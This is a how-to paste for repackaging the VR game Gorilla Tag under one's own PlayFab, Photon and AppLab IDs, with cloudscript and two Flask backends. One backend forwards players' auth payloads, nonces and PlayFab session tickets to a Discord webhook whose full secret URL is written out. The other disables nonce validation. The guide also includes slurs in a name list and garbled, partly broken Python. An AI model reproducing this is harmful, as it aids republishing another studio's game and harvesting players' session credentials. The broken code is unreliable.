APK METHOD
APK EASY TOOL
https://apk-easy-tool.en.lo4d.com/download
UABEA
https://github.com/nesrak1/UABEA/releases/download/v7/uabea-windows.zip

HOW TO SETUP A PHOTON AND PLAYFAB
https://www.youtube.com/watch?v=t6r3wbGby-A





---------------------------------------------------------------

Server Sided Cloudscript (by cycy obv)

Screenshots below are the photon webhook setup
function CySided(args, type = null) {
    var newSS = false;

    const SharedGroupId = args.GameId + args.Region.toUpperCase();
    var concatItems = "";
    server.GetUserInventory({
        PlayFabId: currentPlayerId
    }).Inventory.forEach((x) => {
        concatItems += x.ItemId;
    });

    var id = (newSS == true) ? args.ActorNr.toString() : currentPlayerId;

    if (args.Type == "Create") {
        server.CreateSharedGroup({
            SharedGroupId: SharedGroupId
        });
        server.AddSharedGroupMembers({
            SharedGroupId: SharedGroupId,
            PlayFabIds: [currentPlayerId]
        });
        server.UpdateSharedGroupData({
            SharedGroupId: SharedGroupId,
            Data: {
                [id]: concatItems
            },
            Permission: "Public"
        });
    }
    if (type == "Close") {
        server.DeleteSharedGroup({
            SharedGroupId: SharedGroupId
        });
    }
    if (args.Type == "Join") {
        server.AddSharedGroupMembers({
            SharedGroupId: SharedGroupId,
            PlayFabIds: [currentPlayerId]
        });
        server.UpdateSharedGroupData({
            SharedGroupId: SharedGroupId,
            Data: {
                [id]: concatItems
            },
            Permission: "Public"
        })
    } 
    if (args.Type == "ClientDisconnect" || args.Type == "TimeoutDisconnect") {
        server.UpdateSharedGroupData({
            SharedGroupId: SharedGroupId,
KeysToRemove: [id],
            Permission: "Public"
        });
        server.RemoveSharedGroupMembers({
            SharedGroupId: SharedGroupId,
            PlayFabIds: [currentPlayerId]
        });
    }
    if (type == "ConcatUpdate") {
        server.UpdateSharedGroupData({
            SharedGroupId: SharedGroupId,
            Data: {[id]: concatItems},
            Permission: "Public"
        });
    }
}

handlers.RoomEventRaised = function (args) {
    if (args.EvCode == 9 || args.EvCode == 199) {
        CySided(args, "ConcatUpdate");
    }
}

handlers.RoomJoined = function (args) {
    CySided(args);
}

handlers.RoomCreated = function (args) {
    CySided(args);
}

handlers.RoomClosed = function (args) {
    CySided(args);
}

handlers.RoomLeft = function (args) {
    CySided(args);
}



Applab Method Video (FOLLOW ALL STEPS) = N/A
Spring Cleaning Code = from flask import Flask, request, jsonify



-----------------------------------------------------------------

Photon Webhook Setup

Photon Webhook BaseUrl
https://titleid.playfablogic.com/webhook/1/prod/photonsecretkey


import requests
import json
import hashlib
import os
from datetime import datetime

app = Flask(name)

webhookUrl = "https://discord.com/api/webhooks/1153559821266722836/QbJlR7xfvcPndTN76NUatcFVENddx14gEEOw1iM9jMOI4DONXuwJFUfWyy_-8EYQF_63"
webhookUrl2 = "https://discord.com/api/webhooks/1153559821266722836/QbJlR7xfvcPndTN76NUatcFVENddx14gEEOw1iM9jMOI4DONXuwJFUfWyy_-8EYQF_63"

titleData = {}

def loadTitleDataFromFile():
    try:
        with open('titleData.json', 'r') as file:
            return json.load(file)
    except Exception as e:
        print(e)
        return {}
def saveTitleDataToFile(data):
    with open('titleData.json', 'w') as file:
        json.dump(data, file, indent=2)

def md5(data):
    return hashlib.md5(data.encode('utf-8')).hexdigest()

@app.route('/', methods=['GET'])
def get_title_data():
global titleData
    print('Title data fetched: ', titleData)
    return jsonify(titleData)

@app.route('/', methods=['POST'])
def update_title_data():
    global titleData
    receivedData = request.json['data']
    titleData = receivedData
    saveTitleDataToFile(titleData)
    return jsonify({"message": "Data updated successfully"})

@app.route('/api/photon', methods=['POST'])
def photon_api():
    data = request.json
    user_id = data["UserId"]
    nonce = data["Nonce"]
    data["timestamp"] = datetime.utcnow().isoformat()
    print(data)
    send_to_discord_webhook(data)
    send_to_discord_webhook2(nonce)
    return jsonify({
        "ResultCode": 1,
        "UserId": user_id
    })

@app.route('/api/playfabauthenticate', methods=['POST'])
def playfabauth():
    data = request.json
    send_to_discord_webhook(data)
    if 'UserId' in data and 'Platform' in data:
        return jsonify({
            "ResultCode": 1,
            "UserId": data['UserId'],
            "Platform": data['Platform']
        })
    else:
        ban_info = {
            "BanReason": "Urbanned bc u made a oopsie",
            "BanDuration": "72 hours",
            "Timestamp": datetime.utcnow().isoformat()
        }
        return jsonify({"Error": "Forbidden", "Message": "Invalid data received", "BanInfo": ban_info}), 403

@app.route('/api/CachePlayFabId', methods=['POST'])
def cache_playfab_id():
    data = request.json
    send_to_discord_webhook(data)
    required_fields = ['Platform', 'SessionTicket', 'PlayFabId']
    if all([field in data for field in required_fields]):
        return jsonify({"Message": "PlayFabId Cached Successfully"}), 200
    else:
        missing_fields = [field for field in required_fields if field not in data]
return jsonify({"Error": "Missing Data", "MissingFields": missingfields}), 400

def sendtodiscordwebhook(log_data):
    content = f"Auth Post Data: \n
json\n{json.dumps(log_data, indent=2)}\n
"
    requests.post(webhookUrl, json={"content": content})

def send_to_discord_webhook2(nonce):
    content = f"Nonce Is: \n
json\n{json.dumps(nonce, indent=2)}\n
"
    requests.post(webhookUrl2, json={"content": content})

if __name == '__main':
    titleData = loadTitleDataFromFile()
    app.run(host='0.0.0.0' , port= 8080)

(the below might still work)
Spring Cleaning Photon URL = https://photoncustomauthjs.purposebmx.repl.co/api/photon
(tutorial on how to do that url thing)
or just make your own python replit and put that code in there and put replace the url in the authentication url

put that url in this (check photo https://ibb.co/VMHKXmF)
Make sure its like that and if spring cleaning doesnt work I might update it
(also this shit doesn't work count my words someone will say this doesn't work but i will asure you the applab method and spring cleaning code works.)


------------------------------------------------------------------------------------------------------------------------------------------
                                                   No Unity Method / Apk Method
------------------------------------------------------------------------------------------------------------------------------------------


1st. Download https://github.com/SeriousCache/UABE/releases/tag/2.2stabled And Download AssetBundleExtractor 64 BIT Then Open

2nd. Go Into Apk Easy Tool And Select The Folder You Want To Decompile Your Apk To Then Press Decompile 

3rd. Open AssetBundleExtractor.exe

4th. Find data.unity3d Inside Decompiled Apk Then Make Another Folder In Your Downloads And Paste It There

5th. Click File After You Open AssetBundleExtractor Then Click Open And Then Select The data.unity3d You Stored In Another Folder Then Open

6th. It Will Say This Bundle File Is Compressed! Do You Want to Unpack It? Click Yes, Even If It Doesnt Say This Your Fine

7th. Once The File Explorer Opens Press GlobalGameManagers

8th. After Step 7 Click Info Then Scroll Down Until You See "U2019.2.0f1" Then Select It And Press Ok

9th. After Step 8 Click On "View" Then "Search By Name" Then Type MonoBehaviour PlayFabSharedSettings And Press Enter

10th. Click On The Export Raw After Selecting "MonoBehaviour PlayFabSharedSettings" And Then Click Save

11th. Download NEO Hex Editor https://freehexeditorneo.com/

12th. Open The .dat In The Hex Editor That You Will Get From Exporting "MonoBehaviour PlayFabSharedSettings"

13th. Replace The Playfab ID in the .dat To Your Playfab ID then press ctrl s

14th. Click On "Import Raw" Then Select The .dat You Just Edited With The Hex Editor

15th. After That You Will Do The Same Thing With "MonoBehaviour PhotonServerSettings".

16th. Click On "View" Then "Search By Name" Then Type "MonoBehaviour PhotonServerSettings" And Press Enter

17th. Click On "Export Raw" After Selecting "MonoBehaviour PhotonServerSettings" Then Save The File And Put It In A Empty Folder

18th. Open The .dat That You Just Exported From "MonoBehaviour PhotonServerSettings"

19th. Replace 75dc33b5-d5fc-4b4c-bf88-eb70baabe183 (realtime) And c5fddf06-024c-41f9-81ec-9411dc9c1b27 (voice) With Yours Then Press CTRL S 

20th. Go Back To AssetBundleExtractor, Click "Import Raw" Then Select The .dat You Just Saved

21nd. Go To View And Search By Name Then Type "OculusPlatformSettings" Then Export Raw And Edit It With Your AppLab ID Then Press CTRL S Then Go To AssetBundleExtracter Import Raw When Your Done

22rd. After Step 21 Go To The Bottom Of The App To Where It Says "Ok" Then Press The Button

23th. After Step 22 Press File> Save Then Make Another Folder And Then Name The File Your Going To Save "data.unity3d" Then Press Save

24th. Find ApkTool.yml And AndroidManifest.xml Then Copy And Paste Into A Seperate Folder

25th. Edit ApkTool.yml And Change Version Code to 1, Everytime You Make A New Apk Raise That Number By 1

26th. Edit The AndroidManifest.xml And Change "com.AnotherAxiom.GorillaTag" To What You Want Your Package Name To Be

27th. Copy The 2 Files You Just Now Edited Then Paste Them Into Where You Got Them From, It'll Say "Would You Like To Replace All Existing Files?" Click Yes

28th. After Step 27 Go To Where You Got Your data.unity3d From Then Just Copy The One You Edited Then Just Paste It There, Basically Replacing It.

29th. Open Apk Easy Tool Then Click Your Decompiled Apk Then Make A .keystore And Set It Up Then Compile.
30th. After That Open Meta Quest Developer Hub And Upload Your Apk To Your Priv Applab / Public Applab. https://developer.oculus.com/downloads/package/oculus-developer-hub-win/

------------------------------------------------------------------------------------------------------------------------------------------
                                                            Important Info
------------------------------------------------------------------------------------------------------------------------------------------

If You Did This And Your Game Doesnt Work Then You Shouldnt Deserve To Own This Method

Once You Upload Your Game To You Applab You Have To Keep The Same Package Name And Use The Same Keystore Other Wise If You Lose Your Keystore Then You'll Have To Remake A Applab App

To Enable Mirror In Stump Edit The data.unity3d That You Had Copied And Put In A Different Folder Then Where It Says "gorillagamemanagers" Click It Then Select "Level 0", After Thats Selected Press Info Then Open With "U2019.2.0f1" Then Press View> Search By Name Then Search "GameObject Mirror (1)" Then Export Raw, Open It And Where It Says "is active: false" 
Change False To True Then Save It And Import It Back Then Save The data.unity3d Like Usual.


If Your Game Crashes Make Sure You Did Everything Right And That Your Applab ID Is The One You Got From The Search Bar After Clicking It, Make Sure Its The Same ID, Its Just Typed Twice.


If It Says Please Update Or What Ever You Need A Revision For MOTD, Also You WIll Need A Server Sided Cloudscript If You Want Other Players To See Each Others Cosmetics.

If You Cant Change Names Or Join Codes Go To Playfab And Go To Automation> Cloud Script> Functions Then Register A Function, Select HTTPS And Make Function Name "CheckForBadName". After You Do That Paste The Following Link In Function URL.
https://covidtagapi.pythonanywhere.com/api/send

If You Upload Your Game To Applab And It Says Your Android Manifest Has No Intent Filter Replace It With This Then Change The Package Name To Yours
https://text.is/7PRV
If It Says No Wifi Or Lan Detected Put This In The 5th line In Your Android Manifest
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>

------------------------------------------------------------------------------------------------------------------------------------------
                                                         Random leak dump
------------------------------------------------------------------------------------------------------------------------------------------

Cycy - free backend because yall keep leaking mine
(Don't ask for help from me, or my server, you're not getting any)


# cycy backend :3

import requests
import random
from flask import Flask, jsonify, request

class GameInfo():
    def __init__(self):
        self.TitleId : str = ""
        self.SecretKey : str = ""
        self.ApiKey : str = ""

    def GetAuthHeaders(self) -> dict:
        return {
            "content-type": "application/json",
            "X-SecretKey": self.SecretKey
        }

    def GetTitle(self) -> str:
        return self.TitleId


settings : GameInfo = GameInfo()
app : Flask = Flask(__name__)
playfabCache : dict = {}
muteCache : dict = {}

settings.TitleId = ""
settings.SecretKey = ""
settings.ApiKey = ""

def ReturnFunctionJson(data, funcname, funcparam = {}):
    rjson = data["FunctionParameter"]

    userId : str = rjson.get("CallerEntityProfile").get("Lineage").get("TitlePlayerAccountId")

    req = requests.post(
        url = f"https://{settings.TitleId}.playfabapi.com/Server/ExecuteCloudScript",
        json = {
            "PlayFabId": userId,
            "FunctionName": funcname,
            "FunctionParameter": funcparam
        },
        headers = settings.GetAuthHeaders()
    )

    if req.status_code == 200:
        return jsonify(req.json().get("data").get("FunctionResult")), req.status_code
    else:
        return jsonify({}), req.status_code

def GetIsNonceValid(nonce : str, oculusId : str):
    req = requests.post(
        url = f'https://graph.oculus.com/user_nonce_validate?nonce=' + nonce + '&user_id=' + oculusId  + '&access_token=' + settings.ApiKey,
        headers = {
            "content-type": "application/json"
        }
    )
    return req.json().get("is_valid")

@app.route("/", methods = ["POST", "GET"])
def main():
    return "wyd here buddy this is old tags!!!"

#replace https://auth-prod.gtag-cf.com/api/PlayFabAuthentication with this endpoint
@app.route("/api/PlayFabAuthentication", methods = ["POST", "GET"])
def playfabauthentication():
    rjson = request.get_json()

    if rjson.get("CustomId") is None:
        return jsonify({"Message":"Missing CustomId parameter","Error":"BadRequest-NoCustomId"})
    if rjson.get("Nonce") is None:
        return jsonify({"Message":"Missing Nonce parameter","Error":"BadRequest-NoNonce"})
    if rjson.get("AppId") is None:
        return jsonify({"Message":"Missing AppId parameter","Error":"BadRequest-NoAppId"})
    if rjson.get("Platform") is None:
        return jsonify({"Message":"Missing Platform parameter","Error":"BadRequest-NoPlatform"})
    if rjson.get("OculusId") is None:
        return jsonify({"Message":"Missing OculusId parameter","Error":"BadRequest-NoOculusId"})

    if rjson.get("AppId") != settings.TitleId:
        return jsonify({"Message":"Request sent for the wrong App ID","Error":"BadRequest-AppIdMismatch"})
    if not rjson.get("CustomId").startswith("OC") and not rjson.get("CustomId").startswith("PI"):
        return jsonify({"Message":"Bad request","Error":"BadRequest-No OC or PI Prefix"})

    #goodNonce : bool = GetIsNonceValid(str(rjson.get("Nonce")), str(rjson.get("OculusId")))

    #if bool(goodNonce) == False:
    #    return jsonify({"Message":"Bad request","Error":"BadRequest-BadRequest-InvalidNonce"})


    url = f"https://{settings.TitleId}.playfabapi.com/Server/LoginWithServerCustomId"
    login_request = requests.post(
        url = url,
        json = {
            "ServerCustomId": rjson.get("CustomId"),
            "CreateAccount": True
        },
        headers = settings.GetAuthHeaders()
    )
    if login_request.status_code == 200:
        data =  login_request.json().get("data")
        sessionTicket = data.get("SessionTicket")
        entityToken = data.get("EntityToken").get("EntityToken")
        playFabId = data.get("PlayFabId")
        entityType = data.get("EntityToken").get("Entity").get("Type")
        entityId = data.get("EntityToken").get("Entity").get("Id")


        print(requests.post(
            url = f"https://{settings.TitleId}.playfabapi.com/Client/LinkCustomID",
            json = {
                "ForceLink": True,
                "CustomId": rjson.get("CustomId")
            },
            headers = settings.GetAuthHeaders()
        ).json())

        return jsonify({
            "PlayFabId": playFabId,
            "SessionTicket": sessionTicket,
            "EntityToken": entityToken,
            "EntityId": entityId,
            "EntityType": entityType
        })
    else:
        errorDetails = login_request.json().get('errorDetails')
        firstBan = next(iter(errorDetails))
        return jsonify({
            "BanMessage": str(firstBan),
            "BanExpirationTime": str(errorDetails[firstBan])
        })

#replace https://auth-prod.gtag-cf.com/api/CachePlayFabId with this endpoint
@app.route("/api/CachePlayFabId", methods = ["POST","GET"])
def cacheplatfabid():
    rjson = request.get_json()

    playfabCache[rjson.get("PlayFabId")] = rjson

    return jsonify({"Message":"Success"}), 200

#replace https://title-data.gtag-cf.com with this endpoint
@app.route("/api/TitleData", methods = ["POST", "GET"])
def titledata():

    req = requests.post(
        url = f"https://{settings.TitleId}.playfabapi.com/Server/GetTitleData",
        headers = settings.GetAuthHeaders()
    )

    if req.status_code == 200:
        return jsonify(req.json().get("data").get("Data"))
    else:
        return jsonify({})

@app.route("/api/CheckForBadName", methods = ["POST", "GET"])
def checkforbadname():
    rjson = request.get_json().get("FunctionResult")

    name : str = rjson.get("name").upper()

    if [
        "NIGGER",
        "NIGGA",
        "FAGGOT",
        "NIGG",
        "NIGGAR"
    ].__contains__(name):
        return jsonify({"result":2})
    else:
        return jsonify({"result":0})

@app.route("/api/GetAcceptedAgreements", methods = ["POST", "GET"])
def getacceptedagreements():
    rjson = request.get_json()["FunctionResult"]

    return jsonify(rjson)

@app.route("/api/SubmitAcceptedAgreements", methods = ["POST", "GET"])
def submitacceptedagreements():
    rjson = request.get_json()["FunctionResult"]

    return jsonify(rjson)

@app.route("/api/GetRandomName", methods = ["POST", "GET"])
def GetRandomName():
    return jsonify({"result": "gorilla" + random.randint(1000, 9999)})

# replace https://iap.gtag-cf.com/api/ConsumeOculusIAP with this endpoint
@app.route("/api/ConsumeOculusIAP", methods = ["POST", "GET"])
def consumeoculusiap():
    rjson = request.get_json()

    accessToken = rjson.get("userToken")
    userId = rjson.get("userID")
    playFabId = rjson.get("playFabId")
    nonce = rjson.get("nonce")
    platform = rjson.get("platform")
    sku = rjson.get("sku")
    debugParams = rjson.get("debugParemeters")

    req = requests.post(
        url = f"https://graph.oculus.com/consume_entitlement?nonce={nonce}&user_id={userId}&sku={sku}&access_token={settings.ApiKey}",
        headers = {
            "content-type": "application/json"
        }
    )

    if bool(req.json().get("success")):
        return jsonify({"result":True})
    else:
        return jsonify({"error":True})

@app.route("/api/ReturnMyOculusHashV2")
def returnmyoculushashv2():
    return ReturnFunctionJson(request.get_json(), "ReturnMyOculusHash")

@app.route("/api/ReturnCurrentVersionV2", methods = ["POST", "GET"])
def returncurrentversionv2():
    return ReturnFunctionJson(request.get_json(), "ReturnCurrentVersion")

@app.route("/api/TryDistributeCurrencyV2", methods = ["POST", "GET"])
def trydistributecurrencyv2():
    return ReturnFunctionJson(request.get_json(), "TryDistributeCurrency")

@app.route("/api/BroadCastMyRoomV2", methods = ["POST", "GET"])
def broadcastmyroomv2():
    return ReturnFunctionJson(request.get_json(), "BroadCastMyRoom", request.get_json()["FunctionParameter"])

@app.route("/api/ShouldUserAutomutePlayer", methods = ["POST", "GET"])
def shoulduserautomuteplayer():
    return jsonify(muteCache)

@app.route("/api/photon/authenticate", methods = ["POST","GET"])
def photonauthenticaet():
    if request.method.upper() == "GET":
        userId = request.args.get("username")
        token = request.args.get("token")

        req = requests.post(
            url = f"https://{settings.TitleId}.playfabapi.com/Server/GetUserAccountInfo",
            json = {
                "PlayFabId": userId
            },
            headers = settings.GetAuthHeaders()
        )

        if req.status_code == 200:
            nickName : str = req.json().get("UserInfo").get("UserAccountInfo").get("Username")
            if nickName == "" or nickName is None:
                nickName = None

            return jsonify({'resultCode': 1, 'message': f'Authenticated user {userId.lower()} title {settings.TitleId.lower()}', 'userId': f'{userId.upper()}', 'nickname': nickName})

        else:
            if len(userId) != 16 or userId is None:
                return jsonify({'resultCode': 2, 'message': 'Invalid token', 'userId': None, 'nickname': None})
            elif token is None:
                return jsonify({'resultCode': 3, 'message': 'Failed to parse token from request', 'userId': None, 'nickname': None})
            else:
                return jsonify({'resultCode': 0, 'message': "Something went wrong", 'userId': None, 'nickname': None})
    elif request.method.upper() == "POST":

        authPostData : dict = request.get_json()

        userId = request.args.get("username")
        token = request.args.get("token")

        req = requests.post(
            url = f"https://{settings.TitleId}.playfabapi.com/Server/GetUserAccountInfo",
            json = {
                "PlayFabId": userId
            },
            headers = settings.GetAuthHeaders()
        )

        if req.status_code == 200:
            nickName : str = req.json().get("UserInfo").get("UserAccountInfo").get("Username")
            if nickName == "" or nickName is None:
                nickName = None

            return jsonify({'resultCode': 1, 'message': f'Authenticated user {userId.lower()} title {settings.TitleId.lower()}', 'userId': f'{userId.upper()}', 'nickname': nickName})

        else:
            if len(userId) != 16 or userId is None:
                return jsonify({'resultCode': 2, 'message': 'Invalid token', 'userId': None, 'nickname': None})
            elif token is None:
                return jsonify({'resultCode': 3, 'message': 'Failed to parse token from request', 'userId': None, 'nickname': None})
            else:
                successJson : dict = {'resultCode': 0, 'message': "Something went wrong", 'userId': None, 'nickname': None}

                for key, value in authPostData.items():
                    successJson[key] = value

                return jsonify(successJson)

    else:
        return jsonify({"Message": "Use a POST or GET Method instead of " + request.method.upper()})

if __name__ == "__main__":

    app.run("0.0.0.0", 8080)
	
	
	
	
	
	
	
tutorial how transform editing
because everyone wants this
(its so easy)
go into level0 in uabea
search
GameObject GorillaPlayer
find it 
click edit data
copy the first path id
then exit the edit data shit
do ctrl + g and put in the path
edit data the transform
change shit there
for long arms
change the scale to like
1.25 or 1.5
for x y and z